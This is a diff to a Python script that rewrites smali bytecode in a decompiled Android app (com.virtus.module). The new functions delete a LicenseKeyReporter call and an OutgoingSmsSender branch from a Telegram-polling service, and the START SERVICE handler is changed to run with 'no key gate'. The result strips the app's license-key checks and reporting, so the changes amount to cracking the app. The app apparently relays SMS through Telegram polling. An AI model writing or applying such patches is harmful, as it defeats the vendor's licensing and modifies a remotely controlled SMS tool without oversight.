@@ -193,8 +193,56 @@ def patch_telegram_polling_service() -> None:
     print("TelegramPollingService.smali patched")
 
 
+def patch_process_child_outgoing() -> None:
+    """Remove OutgoingSmsSender gate — Astik inject-only processChild."""
+    path = ROOT / "TelegramPollingService.smali"
+    text = path.read_text()
+    old = """    .line 371
+    invoke-static {p0, v4, v5}, Lcom/virtus/module/OutgoingSmsSender;->trySendFromOutgoingBody(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Z
+
+    move-result v6
+
+    if-eqz v6, :cond_out_send
+
+    invoke-direct {p0, p1}, Lcom/virtus/module/TelegramPollingService;->markConsumed(Ljava/lang/String;)V
+
+    monitor-exit p0
+
+    return-void
+
+    :cond_out_send
+    invoke-virtual {v4}, Ljava/lang/String;->isEmpty()Z"""
+    new = """    .line 371
+    invoke-virtual {v4}, Ljava/lang/String;->isEmpty()Z"""
+    if old in text:
+        text = text.replace(old, new, 1)
+        path.write_text(text)
+        print("processChild OutgoingSmsSender removed")
+    else:
+        print("processChild already Astik-style (skip)")
+
+
+def patch_read_config_reporter() -> None:
+    path = ROOT / "TelegramPollingService.smali"
+    text = path.read_text()
+    old = """    iput-object v4, p0, Lcom/virtus/module/TelegramPollingService;->cfgKey:Ljava/lang/String;
+
+    invoke-static {v4, v4, v5}, Lcom/virtus/module/LicenseKeyReporter;->report(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V
+
+    if-eqz v6, :cond_7"""
+    new = """    iput-object v4, p0, Lcom/virtus/module/TelegramPollingService;->cfgKey:Ljava/lang/String;
+
+    if-eqz v6, :cond_7"""
+    if old in text:
+        text = text.replace(old, new, 1)
+        path.write_text(text)
+        print("readConfig LicenseKeyReporter removed")
+    else:
+        print("readConfig reporter already removed (skip)")
+
+
 def patch_main_activity_3() -> None:
-    """Astik-style START SERVICE: save key if present, start service, no Firebase gate."""
+    """Astik-style START SERVICE: toggle only, no key gate."""
     path = ROOT / "MainActivity$3.smali"
     path.write_text(
         r""".class Lcom/virtus/module/MainActivity$3;
@@ -515,6 +563,8 @@ def patch_main_activity_run_test() -> None:
 
 def main() -> None:
     patch_telegram_polling_service()
+    patch_process_child_outgoing()
+    patch_read_config_reporter()
     patch_main_activity_3()
     patch_main_activity_4()
     patch_main_activity_run_test()
